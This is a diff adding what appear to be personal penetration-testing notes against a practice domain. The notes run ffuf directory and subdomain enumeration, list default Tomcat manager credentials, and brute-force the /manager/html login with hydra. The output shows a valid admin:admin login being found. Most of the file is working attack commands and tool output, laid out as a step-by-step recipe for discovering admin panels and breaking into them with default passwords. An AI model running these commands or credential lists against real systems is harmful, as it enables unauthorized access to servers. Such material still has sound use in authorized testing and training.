@@ -1,0 +1,129 @@
+ffuf -w path to wordlist -u https://example.com/FUZZ         #FUZZ is like the word we are bruteforcing whether it is placed in endpoint or subdomain 
+
+ffuf -w /usr/share/wordlists/dirb/common.txt -u https://pentest-abc.net/FUZZ
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://pentest-abc.net/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+                        [Status: 200, Size: 2744, Words: 850, Lines: 63, Duration: 238ms]
+docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 27ms]
+examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 33ms]
+favicon.ico             [Status: 200, Size: 21630, Words: 19, Lines: 22, Duration: 28ms]
+host-manager            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 37ms]
+images                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 20ms]
+index.html              [Status: 200, Size: 2744, Words: 850, Lines: 63, Duration: 39ms]
+manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 43ms]
+:: Progress: [4614/4614] :: Job [1/1] :: 809 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+https://www.pentest-abc.net/manager/html
+bruteforcing using-
+
+cat bf-pass/tomcat-default-creds                                                                 
+admin:admin
+ADMIN:ADMIN
+admin:j5Brn9
+admin:None
+admin:tomcat
+cxsdk:kdsxc
+j2deployer:j2deployer
+ovwebusr:OvW*busr1
+QCC:QLogic66
+role:changethis
+role1:role1
+role1:tomcat
+root:root
+tomcat:changethis
+tomcat:s3cret
+tomcat:tomcat
+tomcat:Tomcatadm
+xampp:xampp
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+using the above list to bruteforce manager endpoint
+
+-I = ignore an existing restoFILE   colon separated "login:pass" formatre file (don't wait 10 seconds) 
+-V = show login+pass for each attempt 
+-C = FILE colon separated "login:pass" format
+-t = TASKS run TASKS number of connects in parallel per target
+
+hydra -I -V -C "path/file" -t 1 "https-get://www.pentest-abc.net/manager/html"
+
+hydra -I -V -C "bf-pass/tomcat-default-creds" -t 1 "https-get://www.pentest-abc.net/manager/html"        
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-02 18:40:50
+[DATA] max 1 task per 1 server, overall 1 task, 18 login tries, ~18 tries per task
+[DATA] attacking http-gets://www.pentest-abc.net:443/manager/html
+[ATTEMPT] target www.pentest-abc.net - login "admin" - pass "admin" - 1 of 18 [child 0] (0/0)
+[443][http-get] host: www.pentest-abc.net   login: admin   password: admin
+[ATTEMPT] target www.pentest-abc.net - login "ADMIN" - pass "ADMIN" - 2 of 18 [child 0] (0/0)
+[ATTEMPT] target www.pentest-abc.net - login "cxsdk" - pass "kdsxc" - 6 of 18 [child 0] (0/0)
+[ATTEMPT] target www.pentest-abc.net - login "j2deployer" - pass "j2deployer" - 7 of 18 [child 0] (0/0)
+[ATTEMPT] target www.pentest-abc.net - login "ovwebusr" - pass "OvW*busr1" - 8 of 18 [child 0] (0/0)
+[ATTEMPT] target www.pentest-abc.net - login "QCC" - pass "QLogic66" - 9 of 18 [child 0] (0/0)
+[ATTEMPT] target www.pentest-abc.net - login "role" - pass "changethis" - 10 of 18 [child 0] (0/0)
+[ATTEMPT] target www.pentest-abc.net - login "role1" - pass "role1" - 11 of 18 [child 0] (0/0)
+[ATTEMPT] target www.pentest-abc.net - login "role1" - pass "tomcat" - 12 of 18 [child 0] (0/0)
+[ATTEMPT] target www.pentest-abc.net - login "root" - pass "root" - 13 of 18 [child 0] (0/0)
+[ATTEMPT] target www.pentest-abc.net - login "tomcat" - pass "changethis" - 14 of 18 [child 0] (0/0)
+[ATTEMPT] target www.pentest-abc.net - login "tomcat" - pass "s3cret" - 15 of 18 [child 0] (0/0)
+[ATTEMPT] target www.pentest-abc.net - login "tomcat" - pass "tomcat" - 16 of 18 [child 0] (0/0)
+[ATTEMPT] target www.pentest-abc.net - login "tomcat" - pass "Tomcatadm" - 17 of 18 [child 0] (0/0)
+[ATTEMPT] target www.pentest-abc.net - login "xampp" - pass "xampp" - 18 of 18 [child 0] (0/0)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-02 18:40:53
+                                                                                  
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+ffuf -w path -u https://FUZZ.example.com     -mc is matching code only 302,200 
+
+ffuf -w /usr/share/wordlists/dirb/common.txt -u https://FUZZ.pentest-abc.net/ -mc 302,200
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://FUZZ.pentest-abc.net/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 302,200
+________________________________________________
+
+ADMIN                   [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 55ms]
+admin                   [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 49ms]
+Admin                   [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 52ms]
+dev                     [Status: 200, Size: 615, Words: 55, Lines: 24, Duration: 29ms]
+email                   [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 40ms]
+report                  [Status: 200, Size: 5117, Words: 2040, Lines: 147, Duration: 22ms]
+www                     [Status: 200, Size: 2744, Words: 850, Lines: 63, Duration: 17ms]
+:: Progress: [4614/4614] :: Job [1/1] :: 36 req/sec :: Duration: [0:00:33] :: Errors: 65 ::
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
